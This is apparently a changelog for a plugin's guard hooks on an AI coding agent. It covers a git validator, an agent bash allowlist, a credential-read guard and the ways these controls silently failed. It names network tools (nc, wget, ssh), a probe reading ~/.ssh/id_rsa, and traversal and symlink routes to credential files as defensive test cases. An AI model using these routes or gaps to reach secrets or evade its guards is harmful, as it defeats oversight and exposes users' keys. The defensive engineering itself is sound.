(count unchanged, 2026-08-12): `pretool/bash/git-validator` stopped judging a worktree session against the trunk, and the two mechanisms built to prevent that (#2363 worktree-awareness, #3411 shell_cwd) stopped being compensations for a branch read from the wrong directory. THREE defects, one root confusion: the hook carried two different notions of "where am I" and paired them. FIRST and load-bearing, `currentBranch` was `ctx.branch`, which `lib/context.ts:23` computes as `getCachedBranch(getProjectDir())`, and `getProjectDir()` reads the environment, which names the PRIMARY checkout. CC separately sends `project_dir` for where the session actually lives. For a session inside a linked worktree these disagree, so the guard paired the worktree DIRECTORY with the TRUNK's branch. Probed against the built alpha.24 bundle rather than argued: a payload with `project_dir` set to a worktree on `fix/3450-precompact-guard-auto` and no other signal was denied with "Cannot commit or push directly to 'main' branch" while nothing was on main, and the identical payload with `project_dir` set to the primary produced a byte-identical denial, which is how it was isolated. New `resolveSessionBranch()` reads the branch at the dir CC named, and fails closed: an absent, unreadable or `unknown` branch keeps `ctx.branch`, so a malformed payload can never launder a protected-branch push. SECOND, the shell_cwd path added by #3411 was dead in exactly the case it was built for. The WRITER (`posttool/bash/session-heartbeat-publisher:139`) keys state by `repoSlugFromCwd(getProjectDir())` while the READER keyed by `repoSlugFromCwd(input.project_dir || ctx.projectDir)`, and `repoSlugFromCwd` is only `basename()`. The two looked equivalent and are not: CC sends the worktree as `project_dir`, so the reader looked under `<state>/precompact-guard/<sid>.json` while the writer had written `<state>/orchestkit/<sid>.json`. BOTH files were sitting on disk for the same session, which is what exposed it. Path 3 therefore returned null for every worktree session. The reader now keys by the writer's directory; keying state and judging a branch are different questions and no longer share one variable. THIRD, the denial text asserted "This guard reads the COMMAND STRING, not the shell's working directory, so a `cd` you ran earlier is invisible to it." That was true before #3411 and false after, and it collapsed two situations an operator cannot otherwise distinguish: "the guard lost track of your cwd" versus "your cwd really is the trunk". It now branches on `effectiveDir === null` and, in the lost-track case, names the actual cause: shell_cwd is CLEARED rather than guessed by any `cd` that cannot be read statically (`cd "$VAR"`, bare `cd`, `pushd`/`popd`, per `lib/shell-cwd.ts:75,91`), which is fail-closed and correct but invisible. Worth knowing because the repo's own worktree helper prints `WT=$(...) && cd "$WT"`, i.e. following the documented workflow is what clears the record. Why this survived: `git-validator-worktree.test.ts` has been green throughout while writing its fixtures with a local `writeShellCwdState()` keyed by the TEST's project dir, so it validated the reader against state keyed the way the reader happened to read, never the way the writer writes. That file now mocks `getProjectDir` so writer and reader agree on one directory, as they must in production. Four new tests; TWO are true controls that fail against the code they replace (worktree `project_dir` judged against trunk, shell_cwd unfindable under a worktree slug) and two are fail-closed guards that pass vacuously against it, recorded as guards rather than counted as controls.

(count unchanged, 2026-08-12): `lifecycle/pre-compact-guard` stopped blocking AUTOMATIC compaction, and its liveness signal became a real one. The hook took `_input` and never read it, so it could not tell CC's automatic compaction from an explicit `/compact`, and `trigger` ('auto' | 'manual') has been typed and binary-verified in `types.ts` since 2.1.227, so the information was sitting in the payload the whole time. The consequence is worst exactly when the hook matters least: at the context ceiling CC prints "Context limit reached · /compact or /clear to continue" and then runs auto-compaction, the guard vetoed it, and the only remaining exit was `/clear`, which discards the session state the guard exists to protect. Observed live 2026-08-12 in session `0de8dd40` at 100% context. The remedy the block message offered was unreachable from there too: `CLAUDE_CODE_ALLOW_COMPACT_DURING_AGENTS` is read from the hook process env, which is inherited fixed at CC launch, so acting on the advice required a restart that loses the same context. Auto now passes through unconditionally as the FIRST statement in the handler, ahead of the env check, and the message no longer implies a mid-session escape: it names the repeat, states that auto-compaction is never blocked, and scopes the env var to future sessions. Manual `/compact` still blocks; that case is the hook's actual purpose and is unchanged. SECOND defect, independent of the first: "active" was recency, not liveness. `subagent-spawns.jsonl` is a spawn-INTENT log written by `subagent-validator` (`source: 'start'`) and `pretool/task/spawn-intent-logger` (`source: 'pretool'`), and NOTHING anywhere writes a completion record. Measured on the author's log: 839 lines, `{start: 694, pretool: 145}`, zero terminal entries, and the SubagentStop hooks write to entirely different files. So an agent that finished ten seconds after spawning still blocked compaction for the remaining ~5 minutes, and the guard had no way to know. Fixed by preferring `input.background_tasks`, CC's authoritative live-task list (2.1.145+), which `subagent-stop/watchdog` has already consumed since #1882 for the same class of phantom-agent bug. When that array is present it is trusted EXCLUSIVELY, including when it is EMPTY, because an empty list means nothing is running regardless of what the intent log recorded minutes ago, and treating empty as "no signal" would reinstate the defect. The timestamp window survives only as the fallback for CC below 2.1.145. Deliberately NOT fixed by writing our own completion records into `subagent-spawns.jsonl`: `watchdog` reads the last 20 lines of that file and treats every entry as a live spawn, so appending terminal rows there would have made the watchdog report completed agents as hung, trading one phantom-agent bug for another. THIRD, the fallback now dedupes by `agent_id`, keeping the newest row per agent. One agent is logged twice by design (once per writer) and observed logs also carry repeat `start` rows for a single `agent_id` across SendMessage resumes (`ackleg2-342893b6ee509b85` appears at both 05:46:47 and 05:50:49), so `active.length` counted one agent as several and the block message named it repeatedly. Entries without an `agent_id` cannot be correlated and are each kept as their own. FOURTH, defect 2 got an actual remedy rather than only honest wording: the first manual `/compact` blocks and drops a session-keyed marker at `.claude/state/precompact-confirm-<sessionId>.json`, and a second within 60s consumes it and proceeds. That is the only override reachable from inside a session the guard has already stopped, which is the whole complaint: an env var fixed at CC launch is not an escape hatch for someone already trapped. The marker follows the `nudge-outcome-state.ts` convention, and every write is best-effort because a failed write costs the user one extra `/compact` but must never change the verdict or throw out of the hook. Auto deliberately does NOT consume the marker, since it never blocks and so never needs a confirm; a test pins that, otherwise an auto pass could silently spend a confirm a manual attempt was holding. Why this survived: all five existing tests passed and still pass, because every one of them constructs an input with no `trigger` and no `background_tasks`, which exercises only the fallback path. Of the eight new tests, six are true controls that FAIL against the code they replace (the four liveness/auto ones: auto-compaction blocked, empty `background_tasks` ignored, live `background_tasks` unread, duplicates counted twice; plus two confirm ones: no marker written on first block, repeat not honoured). The remaining two confirm tests pass vacuously against the prior code because it blocked unconditionally and never unlinked, so they are recorded here as regression guards, not as controls: counting them as controls would be the exact green-test-beside-an-inert-control failure this changelog keeps documenting.

(count unchanged, 2026-08-12): `agent/restrict-bash` executed for the first time, and the `if` gate on the `PreToolUse`/`Bash` matcher block was removed (#3430, #3438). The hook had zero registrations in `hooks.json` and zero timing entries across 193,606 telemetry rows: the allowlist was well-built (40 entries, deny-by-default, correct compound handling) and had simply never run, so every unit test of it passed against a control nobody was subject to. It is now member 4 of `sync-bash-dispatcher`. Three findings came out of wiring it, each of which would have shipped a control that looks live and is not. FIRST, the mechanism named in the issue's own decision comment does not work: that dispatcher's only matcher block carried `"if": "Bash(git *) || Bash(npm *) || ..."` admitting 13 command prefixes, so routing a deny-by-default allowlist through it leaves 28 of the 32 allowlisted head-commands never evaluated (`ls cat grep jq rg find gh …`) while `ssh`, `wget`, `nc`, `scp` are silently allowed — and the issue's required gate ("assert a `restrict-bash` timing entry appears") would have PASSED anyway, because `git status` reaches the hook. An enumerated gate cannot front a deny-by-default allowlist at all: whatever is not enumerated is never judged. The gate is therefore deleted rather than widened, which is also the whole of #3438 (`network-egress-guard` had the identical problem and could only see 1 of the 7 vectors it documents). SECOND, identity moved from `process.env.CLAUDE_AGENT_ID` to the payload (`input.agent_type ?? input.subagent_type`, through `normalizeAgentName` because CC sends `ork:`-prefixed names — matching bare names is the #3354 defect). The env var has no guarantee of being set inside a globally-registered hook, and reading `'unknown'` there would make the control restrict every session or none. The new guard is an allowlist of RESTRICTED AGENTS rather than a test for "am I a subagent", so an absent or unrecognised identity falls through to `outputSilentSuccess()` — today's exact behaviour — making the change safe whether or not the payload carries the field. THIRD, member ORDER decides which verdict wins, because the dispatcher short-circuits on the first non-silent result: with `restrict-bash` placed after `network-egress-guard`, a restricted agent running `nc -l 1234` got `ask` (a prompt a human might approve) instead of the `deny` its allowlist demands. It now sits before egress-guard and after the universal blockers, so the strictest applicable control decides for the 7 agents it governs while every other session pays one Set lookup. Also removed from the allowlist: `python -c`, `python3 -c`, `node -e`, `node --eval`. Those are arbitrary code execution filed under "Misc read-only", and they contradict the hook's own denial text ("this agent investigates and reports — it does not modify the system"); they were harmless while the control was inert, but activating it would have shipped a live bypass. Cost of removing the gate, measured before committing rather than assumed: 47.9 ms per Bash call end to end, of which 33.6 ms is bare node startup, against the 50 ms `PreToolUse` budget — the process spawn dominates and headroom is thin, so `__tests__/agent/restrict-bash-budget.test.ts` asserts the in-process member chain stays cheap (it cannot assert wall-clock without being flaky on CI runners). Positive control in `__tests__/agent/restrict-bash-dispatcher.test.ts` covers all four required cases plus the two regressions found while writing them; case 3 (no `agent_type` is untouched) is the one that catches restrict-every-session, and case 4 deliberately asserts on commands OUTSIDE the old 13 prefixes, since asserting on `git status` would have passed under the broken design too.

(count unchanged, 2026-08-10): `posttool/bash/session-heartbeat-publisher` now tracks the persistent Bash shell's cwd, and `pretool/bash/git-validator`'s third resolution path became real for the first time (#3411). The validator resolves where a git command will run from `git -C <dir>`, then a `cd` in the same command, then `shell_cwd` from session state. That third path was credited to `lifecycle/cwd-changed` and had never once executed: CC does not fire `CwdChanged` for a `cd` inside a Bash tool call, so on the author's machine 1763 recorded session-state files contained ZERO `shell_cwd` keys and `hooks.log` held exactly one `cwd-changed` line, which was a synthetic probe written during this investigation. Everything about that hook is correct (registered in both `hooks.json` and `entries/lifecycle.ts`, payload keys `old_cwd`/`new_cwd` matching what the 2.1.226 binary documents and builds, and a well-formed synthetic payload produces a correct write on the first try); the event simply does not arrive. Consequence for the operator: hook processes are spawned with cwd = the PROJECT dir, so a bare `git commit`/`git push` issued while the shell sat in a feature-branch worktree was judged against the primary tree and denied as "Cannot commit or push directly to 'main'" while nothing was on main. Measured cost on 2026-08-10: eight denials logged to `permission-feedback.log` between 16:14 and 16:21, each recording branch `main`, all on correct work, and the operator had to discover by trial that `git -C <dir>` and `cd <dir> && git ...` were the two accepted spellings. Since the command string is the ONLY place this information exists, new `lib/shell-cwd.ts` derives the effect of a command on the shell's cwd and the heartbeat publisher persists it; that hook was chosen because it already owns the state write, so tracking adds no I/O, and it still adds none for a command that neither cds nor touches git. Failure modes lean deliberately: a `cd` inside `sh -c '...'` or `( ... )` reports UNCHANGED because the parent shell genuinely does not move, a `cd` to a non-existent path leaves the record alone because that `cd` failed, and `pushd`/`popd`/bare `cd`/`cd -` DROP the record so the validator returns to its fail-closed verdict rather than trusting a stale directory. Relative targets compound against the running value, so `cd a && cd b` lands in `<base>/a/b`. Two things the issue claimed that measurement refuted, recorded so nobody re-fixes them: `cd X && git add -A && git commit` was NOT broken (`locateGitSegment` carries `cdTarget` across segments, so it resolved correctly all along), and the `-C` match needs no un-anchoring because it runs against the already-sliced git segment. The remediation text's `gh pr create --base dev` was real, and is now just `gh pr create`: `dev` is HQ's convention and wrong in this repo, and since the hook ships to other repos, naming ANY base can only be wrong somewhere, while `gh` already defaults to the repo's own. Why this survived so long is the useful part: `git-validator-worktree.test.ts` has asserted "commit from a feature-branch worktree (shell_cwd) is not blocked" since #2363 and has been green throughout, because the test calls its own local `writeShellCwdState()` helper. It validated the reader against state no writer ever produced, which is half a contract reported as the whole one. The new `__tests__/integration/shell-cwd-contract.test.ts` never writes state itself, drives the real publisher for every case, and each assertion carries the negative control that fails without the fix. Verified additionally against a freshly built bundle rather than only vitest: bare commit DENY with no tracked cwd, `shell_cwd` on disk after a `cd`, bare commit and bare push both "not blocking", and the DENY returning after a `cd` back to the primary tree.

(count unchanged, 2026-08-10): `pretool/bash/gh-label-enforcer` and `pretool/bash/gh-milestone-enforcer` gained repo-scope awareness and the label enforcer stopped denying (#3389). Both hooks were pure flag parsers with no notion of which repo they were governing, so on 2026-08-10 a `gh issue create --repo herdrdev/herdr ...` (a third-party repo) was hard-denied for missing a label from THIS project's taxonomy, and the milestone enforcer nudged about our sprint tracking on the same foreign repo. Both now skip entirely when the command carries an explicit `--repo`/`-R` flag or `GH_REPO=` prefix (new shared `lib/gh-command.ts`); the hooks cannot verify a foreign repo's label vocabulary without network calls, and appending a label that does not exist there turns a nit into a hard `gh` failure, so out-of-scope is the honest posture. Second change: for a simple in-repo `gh issue create` without `--label`, the enforcer now REWRITES the command via `updatedInput` (CC 2.1.25), appending a label inferred from the `--title` (docs outranks bug so "fix typo" lands as docs; default `chore`), with an `additionalContext` note naming what was added — the old `outputDeny` cost the whole turn over a nit the hook could fix itself. No `permissionDecision` is set on the rewrite, so it still rides through the normal permission prompt. The #3283 compound-command carve-out is unchanged: appending to a compound string cannot target the right segment without a real parser, so compounds keep the advisory. The `sync-bash-dispatcher` merge loop was verified to propagate `updatedInput` + `additionalContext` from a single hook result before this was built, so the auto-correct is load-bearing, not a #3386-class silent no-op.

(219 -> 215, global 153 -> 149, 2026-08-09): retired ork's ownership of worktree provisioning. Removed the entire `WorktreeCreate` event key plus `worktree/worktree-provisioner`, `worktree/exit-finalizer` and `worktree/worktree-lifecycle-logger`, and deleted `lib/children-bus.ts` and `lib/monorepo-advisory.ts` whose only callers those were. The decisive fact came off the shipped 2.1.226 binary rather than the docs: `hasWorktreeCreateHook()` (`UHe`) returns true if ANY hook is registered on `WorktreeCreate` — plugin hooks included, with no filter on `async` and no check that the hook returns a path — and its single call site takes the hook branch or the native branch, never both. So registering a provisioner did not extend CC's provisioning, it REPLACED it, and every feature ork did not reimplement died silently: `.worktreeinclude`, `worktree.baseRef`, `settings.local.json` propagation into the worktree, `core.hooksPath` pointed back at the main repo, PR-based worktrees (`pull/N/head`), realpath containment verification, `git worktree lock`, and branch deletion on cleanup. ork reimplemented exactly two of the twelve things the native branch does (path placement and `worktree.sparsePaths`), while four ork reference docs continued instructing operators to set `worktree.baseRef`, which had been inert for them the whole time. Removal was also broken, not merely absent: CC dispatches `WorktreeRemove` only for hook-created worktrees and refuses when the directory is non-empty, which a real worktree always is, and the `git worktree remove` fallback lives in the `!hookBased` branch — so provisioned worktrees leaked. Measured on the author's machine 2026-08-09: `worktree-events.jsonl` held 11 lines all-time of which exactly ONE came from a real worktree (2026-07-18, `rows_updated: 0`), the other ten from vitest temp dirs writing into the live project log; three `worktree-pending` markers were uncleaned, one from 2026-08-06 and two from agents that had completed minutes earlier in the same session. The `worktree_links` cascade `exit-finalizer` existed to run has never fired in production: the only `INSERT INTO worktree_links` in the entire repo is in `__tests__/worktree/exit-finalizer.test.ts:53`, so the UPDATE always matched zero rows, which the one real log line confirms. The schema itself is left alone deliberately — editing a shipped migration does not affect databases that already ran it and would drift fresh installs from existing ones; the table's fate belongs to #3353, which now has no reader left to weigh. `WorktreeCreate`'s `lifecycle/webhook-forwarder` entry had to go with the rest even though it is pure async telemetry, because the gate does not care what a hook does: leaving it would keep CC out of its own provisioning path with nothing left to provision, which is strictly worse than either end state. The pre-#3315 wiring assertions in `hooks-json-wiring.test.ts` were INVERTED rather than deleted, so re-registering anything on that event fails the suite. The `.worktreeinclude` semantics ork would have had to maintain forever are non-trivial and were reverse-engineered during the investigation (gitignore-syntax patterns matched only against `git ls-files --others --ignored --exclude-standard`, i.e. ignored-and-untracked files only, with directory entries expanded by literal-prefix probe), which is itself an argument against carrying an approximation of someone else's reference implementation.

(218 -> 219, global 152 -> 153, 2026-08-09): added `pretool/read/credential-read-guard`, the first PreToolUse hook on the Read tool that can deny. `src/settings/ork.settings.json` has declared five `Read(...)` deny rules since v7 (`~/.aws/credentials`, `~/.ssh/**`, `~/.gnupg/**`, `~/.netrc`, `~/.npmrc`), and none of them has ever enforced anything: a PLUGIN settings.json is not a settings scope Claude Code reads, so those five lines are documentation that looks like a control. The hook estate did not cover the gap either. Before this change ork registered 19 `pretool/bash/*` hooks and 3 `pretool/write-edit/*`, but the only `pretool/read/*` hook was `tldr-summary`, which is an advisory summarizer that returns silent success on every path it does not summarize. Measured 2026-08-09: a probe of `{"tool_name":"Read","tool_input":{"file_path":"~/.ssh/id_rsa"}}` returned rc=0 with NO `permissionDecision` from every registered hook, so those paths were protected by nothing. This is protection that never existed, not protection that regressed, which is why it does not appear as a fixed count elsewhere. Matching is POST-RESOLUTION and deliberately two-formed, because a single form leaks in one direction: the lexically resolved path (`~` expanded via `os.homedir()`, `..` collapsed by `resolve()`) catches traversal like `/tmp/../Users/me/.ssh/id_rsa` AND catches a guarded path that is itself a symlink pointing out of the tree, while `resolveRealPath()` from `lib/path-containment.ts` catches a symlink outside the tree pointing IN (`/tmp/leak -> ~/.ssh/id_rsa`). A hit on either denies. Containment uses the existing `isInsideDir()` (a `relative()` test, not `startsWith()`), so `~/.sshevil/` does not match `~/.ssh` (test-probed). The rule table is anchored 1:1 to the five declared paths, each rule anchored to an absolute path under the real home, so a repo-local `.npmrc` is untouched (probed: allowed) and no ordinary repository file can match. Judgement call worth recording: a bare `~/.ssh` DIRECTORY read is DENIED, not allowed. Listing the directory is the recon step that precedes reading a key, the declared contract was already tree-scoped (`~/.ssh/**`), and no legitimate workflow needs the agent to enumerate it. The catch-all passes through rather than failing closed: the only inputs that reach it are ones we could not resolve to a path at all, which by construction cannot be a guarded credential path, and failing closed there would break every Read in the session on an unrelated bug. NOT added to `lib/security-hooks-registry.ts`; that set is a fixed six pinned by `security-critical-hooks.test.ts` and widening it is a separate decision. One probe artifact worth knowing before someone re-discovers it as a bug: a hand-written probe payload that omits `hook_event_name` makes `run-hook.mjs` fall back to `hook_event = 'unknown'`, and the #1794 output guard then strips `hookEventName` from the deny envelope and warns on stderr. With the real CC payload (`hook_event_name: "PreToolUse"`) the envelope is intact and the deny is well-formed. Registered in BOTH `hooks.json` (first in the Read matcher, ahead of tldr-summary) and `entries/pretool.ts`; the pair was verified load-bearing by removing ONLY the entries-map record, rebuilding, and confirming the same payload silently returns `{"continue":true,"suppressOutput":true}` with no decision, which is the #959 dead-hook signature exactly.

(count unchanged, 2026-08-02): `pretool/bash/git-validator` branch-protection gained branch-SWITCH awareness — the TOCTOU sibling of #2363's worktree awareness. The validator judged `ctx.branch` (the branch at PreToolUse time), but a compound command may switch branches before it mutates: `git checkout -b feat/x -q && git commit ... && git push` fired from main is exactly the workflow the hook's own error message prescribes, yet it was denied. Two live false positives on 2026-08-02 alone (the #3245 rebase retry and the #3241-era branch+commit chain); the same defect existed independently in the user-global `~/.claude/hooks/block-direct-dev-main-push.sh` and was fixed there the same day with matching semantics. New `extractPreCommitSwitchTarget()` returns the LAST `git checkout <b>` / `checkout -b <b>` / `switch [-c] <b>` target preceding the first `git commit`/`git push`; a non-protected target allows with context, a protected target (`git checkout main && git push`) still blocks, file restores (`checkout -- <paths>`, `checkout <ref> -- <paths>`) are not switches, and a switch AFTER the mutation does not rescue it. 9 new tests in `git-validator-worktree.test.ts` pin both incident commands verbatim plus the still-block matrix.

(count unchanged, 2026-08-01): prompt/multi-step-task-nudge added INSIDE prompt/unified-dispatcher (no hooks.json entry), plus task-usage telemetry in stop/task-completion-check. CLAUDE.md's "Use TaskCreate for 3+ step work" rule had NO enforcement and NO measurement: the one hook ever written for it (`pretool/task/task-existence-gate.ts`, 2026-03-11) was never registered in either hooks.json or the entries map — the #959 pair, both halves missing — and even wired it would not have helped, since it matches PreToolUse[Agent] inside active pipelines only and exempts Explore/general-purpose/Plan/claude-code-guide/statusline-setup plus all background spawns, i.e. every agent ordinary sessions use. Measured consequence (2026-08-01 session): ~7 harness task reminders, a different judgement call each time. The fix uses only surfaces verified live the same day: a UserPromptSubmit sub-hook detects 3+ step shape (2+ list items, 3+ distinct build-verbs, or 2 verbs + sequencing; explicit todo/task mentions bypass the throttle) and injects an advisory TaskCreate re-anchor, throttled at 1st-then-every-6th; the CC-native TaskCreated event (shipped 2.1.84; this session's own TaskCreates observed in `.claude/logs/task-creations.jsonl` within seconds) silences it PERMANENTLY for the session via a 16KB tail-read of that log (`lib/task-usage-signal.ts`, fails closed as "tasks exist" so a read error can never mean per-turn noise); and Stop-side, task-completion-check appends per-session `task-nudge-outcomes.jsonl` telemetry (qualifying_prompts × tasks_used) with a state-transition guard capping it at 2 lines/session, because Stop fires per turn (measured 1,236 Stops across ~350 sessions), giving the rule its first denominator — read by `scripts/task-compliance.mjs` (added same day: telemetry without a consumer is proto-theater, per the 2026-08-01 audit), which prints the compliance rate over a window and is registered in telemetry-inspect's inventory. Deliberately advisory end to end — TaskCreated supports blocking since 2.1.89 and this uses none of it; a blocking task gate trains `--no-verify` reflexes. The dead task-existence-gate is left untouched for a separate wire-vs-delete decision. 16 tests, fixtures verbatim from the motivating session, including a documented MISS case (terse asks stay quiet: precision over recall) and the counter-advances-while-silenced invariant the telemetry depends on.

(count unchanged, 2026-07-30): `subagent-stop/output-validator` stopped being a kill-switch on five sibling hooks. It read `input.agent_output || input.output || ''` and pushed a validation ERROR when that was falsy, and any error makes it return `continue: false`. Claude Code delivers NEITHER field at SubagentStop: 0 of 11,319 captured rows carried either, already recorded in `subagent-stop/unified-dispatcher.ts` (#3034). Since `sync-subagent-stop-dispatcher` short-circuits on the first `continue: false` (line 67) and output-validator sits at index 0 of a 6-entry `SYNC_HOOKS` array, the hook blocked on effectively 100% of real events and the five hooks queued behind it never executed: `auto-spawn-quality`, `multi-claude-verifier`, `subagent-quality-gate`, `retry-handler` and `skill-channel-tracker`. Note `retry-handler` is functional logic, not telemetry, so this was never only an observability bug. Measured consequence: `skill-channels.jsonl` held 559 rows across all 16 copies on the author's machine with ZERO tagged `channel:"subagent"`, against 107+ real `Skill` tool_use blocks present in sub-agent transcripts, for roughly two months. Fix distinguishes "CC never sent the field" from "the agent returned an empty string": `rawOutput = input.agent_output ?? input.output`, `outputDelivered = typeof rawOutput === 'string'`, and Checks 1 and 2 are gated on `outputDelivered`. An absent payload field is a contract fact, not an agent defect. Deliberately NOT fixed by reordering `SYNC_HOOKS` (that hides a broken validator) nor by blanket `continue: true` (that discards block semantics where they are legitimate) — an explicitly delivered empty string still blocks, and there is a test pinning that so the gate cannot be "fixed" by disabling it. Also corrected two tests in `output-validator.test.ts`: one asserted `continue === false` for an absent field, which was the bug written down as a contract; the other claimed to cover a null-ish field but passed `undefined` into a defaulted parameter, so JS default substitution turned it into a duplicate of the empty-string case and it verified nothing. New `sync-subagent-stop-dispatcher.test.ts` (7 tests) is the first integration test for that dispatcher at all, which is why this survived: every hook in the array had a green unit test, and `skill-channel-tracker.test.ts` calls its handler directly and never touches the dispatcher that starved it. The invariant it pins is structural — the dispatcher's only early return is the `continue === false` short-circuit, so asserting `continue !== false` on the real CC payload proves every hook was reached.

(count unchanged, 2026-07-28): `processTerminationAsk()` now requires COMMAND POSITION, and `-f` precision is judged by breadth rather than punctuation. Two defects, reported from the field as "this happens in multiple repos". First: the segment test was `command.match(/\b(kill|pkill)\b[^&|;]*/i)`, which matched the word ANYWHERE in the string, including inside a quoted argument. So commands that terminate nothing at all prompted: `grep -rn "pkill" src/`, `echo "use pkill -f ..." >> NOTES.md`, `git commit -m "stop pkill prompts"`, `sed -n '/pkill -f/p' file`. Every repo where process cleanup is discussed in code, docs or commit messages hit it, which is why it read as the hook being broken everywhere rather than as one rule being wrong. Replaced by `terminationCommandSegment()`, which walks the string tracking quote state (same approach this file already uses for interpreter pipes, because a `|` inside quotes is literal text) and only accepts the word at the start of a command: string start, or after `|`/`;`/`&`/`(`/newline, with `sudo`/`then`/`do`/`else`/`time` treated as passthrough. Second: the `-f` carve-out demanded a path separator or a script extension, so every ordinary binary name still asked. `pkill -f agent-browser` prompted on every invocation despite naming exactly one program. Inverted to match the rule's own stated criterion, which is breadth: ask when the `-f` target is a bare generic runtime (`node`, `python3`, `bash`, `npm`, ...) because that matches a CLASS and on a multi-session machine takes out every session; allow a specific binary name. 17 new tests pin both halves (6 inert-mention cases, 4 real-termination-after-operator cases so the position fix cannot silence genuine kills hiding behind a pipe or `&&`, 4 specific-binary allows, 3 generic-runtime asks); 173 tests total across dangerous-command-blocker + bypass-mode-ask-gate.

(219 -> 218, skill-scoped 22 -> 21, 2026-07-28): removed `skill/release-state-loader`. Its only consumer was the `release-checklist` skill (PreToolUse/Read, `once:true`), deleted in the same change as one of 9 unreachable orphan skills. Deleting the consumer left the hook registered in `entries/skill.ts` with nothing able to dispatch it, which is precisely the #959 dead-hook class: present in the registry, unreachable from `hooks.json` union agent/skill frontmatter. `scripts/validate-registry.mjs` caught it as a NEW DEAD HOOK on CI, and separately caught the count drift this description had not been re-stamped for. Worth noting for future skill deletions: removing a skill that owns a skill-scoped hook is a two-part change, and re-stamping only `manifests/ork.json` and `README.md` is not enough, because `hooks.json`'s own description carries the count too (`.claude/rules/count-sync.md` step 3). `releaseStateLoader` and its now-orphaned `readPackageJson` import were deleted from `skill/context-loaders-git.ts`; the other four loaders in that file are untouched and still wired.

(count unchanged, 2026-07-27): every ork ASK tier is now skipped under `bypassPermissions`, and the process-termination rule was rewritten around breadth. `--dangerously-skip-permissions` switches off CC's OWN permission engine; it does NOT switch off a PreToolUse hook answering `ask`, which CC honours on top of whatever mode the session is in. So ork re-introduced confirmation prompts for users who had explicitly opted out, in every repo ork is installed in. New `lib/guards.ts:isBypassMode()` (reads `permissionMode === 'bypassPermissions'`, with a snake_case fallback so a key rename cannot silently un-gate it); applied to the ASK tiers of dangerous-command-blocker, network-egress-guard, compound-command-validator, context-file-budget-guard, and task-agent-advisor (which degrades to its old advisory `additionalContext` rather than falling fully silent). DENY tiers are deliberately untouched: catastrophic commands are exactly what an unattended bypass run needs blocking. ONE documented exception: `pretool/task/fable-spend-consent` still asks, because it gates MONEY not permissions, and the flag says nothing about spend (`ORK_FABLE_OK=1` remains the pre-consent path). Same change set: `types.ts` `permissionMode` now mirrors `claude --permission-mode` verbatim (it listed 4 of the 7 values, so `bypassPermissions` was not even expressible). Second half: the process-termination ASK was a bare `\b(kill|pkill|killall)\s+`, the noisiest entry in the tier, firing on every `pkill -f my-test.sh` an agent ran to clean up a process it had started one line earlier. Replaced by `processTerminationAsk()`, which asks on breadth or force (`killall` anything, `-9`/`-KILL`/`-SIGKILL`, `pkill -u`, bare-name `pkill node`, which on a multi-session machine takes out every other session) and allows precision (`pkill -f` at a target carrying a path separator or script extension, `kill <pid>`). A helper, not a regex: the rule is "how many processes can this match", which does not reduce to one readable pattern. New `bypass-mode-ask-gate.test.ts` pins the cross-hook invariant (each ASK site asks in default mode AND falls silent in bypass; DENY survives both) so a future ASK site that forgets the gate shows up as a gap in one list; 22 tests there plus 16 in dangerous-command-blocker.test.ts and 5 in guards.test.ts.

(count unchanged, 2026-07-26): prompt/visual-style-nudge added INSIDE prompt/unified-dispatcher (no hooks.json entry). The visual-style rule works but DECAYS: `.claude/rules/*.md` gets re-surfaced by instructions-loaded/priority-map every time a matching file is touched, but `src/rules/visual-style.md` lives OUTSIDE that dir and is reachable only via a one-line CLAUDE.md pointer, so it loads once at session start and nothing re-fires it. Measured 2026-07-26: 6+ manual "vis in ascii emojies" re-asks in one session. The sub-hook re-anchors the rule on prompts wanting a shaped answer (status/compare/options/explain/show-me, plus explicit viz asks). Deliberately NOT once-per-session like executor-route-nudge — firing once would reproduce the decay it exists to fix — so it is throttled by prompt count (fires on the 1st qualifying prompt, then every 8th). Zero permanent system-prompt cost; per-turn only when fired, inside the dispatcher's 800t cap. 10 tests, both throttle failure modes mutation-checked (once-per-session -> 1 fail, every-turn -> 2 fails).

(count unchanged, 2026-07-26): pretool/write-edit/context-file-budget-guard added inside sync-write-edit-dispatcher (retro-hardening mechanism 6, no new hooks.json entry). MEMORY.md/CLAUDE.md load into every session and their ceilings fail silently (MEMORY.md stops loading past ~24 KB with no error); the only prior control was post-hoc (CI perf test / dream report), which on 2026-07-26 surfaced a structurally-unreachable 17 KB index target only at the END of the rebuild. The guard projects the post-write byte size BEFORE the write lands and ASKs when it crosses budget (MEMORY.md 17 KB, CLAUDE.md 20 KB, override ORK_CONTEXT_FILE_BUDGET_BYTES). ASK not DENY, per the #2947 display-lint lesson. Edit projection reads-and-applies old_string/new_string (a plain size delta is wrong for replace_all/multi-occurrence — test-pinned). Hot-path note: non-guarded files exit on a basename lookup with zero file I/O; the read happens only for the two guarded basenames. 12 tests in context-file-budget-guard.test.ts including multi-byte (bytes-not-chars) and fail-open paths.

(count unchanged, 2026-07-24): spawn-log name-shadowing fixed at the only observable point (M170/#3129). CC's SubagentStart payload puts a named spawn's NAME in agent_type, shadowing the real type — 20.7% of a 30d window was unclassifiable and every catalog metric undercounted. pretool/task/spawn-intent-logger now records the (subagent_type, agent_name) pair from tool_input (and logs the general-purpose default when a named spawn omits the type — previously those spawns were skipped entirely); subagent-start/subagent-validator documents the shadowing at its write site. run-activation-audit.sh joins start rows against the pretool name map and prints how many it resolved. Start rows themselves stay as-is: the real type is structurally absent from that event.

(count unchanged, 2026-07-24): prompt/executor-route-nudge added INSIDE prompt/unified-dispatcher (M170/#3127, no hooks.json entry). Skill telemetry showed think skills at 141 runs/30d vs executor skills at 6, and 43 traced router hand-offs reached ZERO executors — build-shaped goals get worked inline, so the executors' specialist wiring never activates. The sub-hook fires at most once per session: a build/fix-verb goal prompt (>=40 chars, no explicit /ork: invocation) gets a one-line reminder that /ork:implement, /ork:fix-issue, /ork:cover carry the specialist wiring. Self-gated via a session flag file rather than runOnce, because it must watch every prompt until the first build-shaped one. Companion change: ork:auto SKILL.md hand-off section now mandates the Skill-tool invocation in the same turn as the user's nod (a hand-off is an invocation, not a recommendation).

